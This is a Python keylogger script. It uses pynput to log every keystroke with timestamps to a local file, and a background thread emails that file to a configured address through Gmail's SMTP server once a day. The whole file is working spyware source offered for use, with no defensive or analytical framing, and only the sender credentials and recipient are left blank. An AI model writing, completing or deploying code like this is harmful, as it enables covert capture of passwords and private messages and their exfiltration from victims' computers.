from pynput.keyboard import Listener
import logging
import smtplib
import ssl
from email.message import EmailMessage
import time
import threading
import certifi
import os

os.chdir(os.path.dirname(os.path.abspath(__file__)))

sender = ""         # Enter a valid email address
password = ""       # Enter the secure password
receiver = ""       # Enter the email address to receive the logs
subject = "Keylogger Info"

log_dir = ""

logging.basicConfig(filename=(log_dir + "data.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    key = str(key).replace("'", "")
    logging.info(key)

def send_email():
    logEmail = EmailMessage()
    logEmail['From'] = sender
    logEmail['To'] = receiver
    logEmail['Subject'] = subject
    logEmail.set_content("data.txt")
    logEmail.add_attachment(open("data.txt", "r").read(), filename = "data.txt")

    context = ssl.create_default_context(cafile=certifi.where())

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:    # Send the email using SMTP
        server.login(sender, password)
        server.send_message(logEmail)

def start_email_timer():
    while True:
        time.sleep(86400)   # 24 hours
        send_email()

email_thread = threading.Thread(target=start_email_timer, daemon=True)
email_thread.start()

with Listener(on_press=on_press) as listener:   # Start the keylogger
    listener.join()
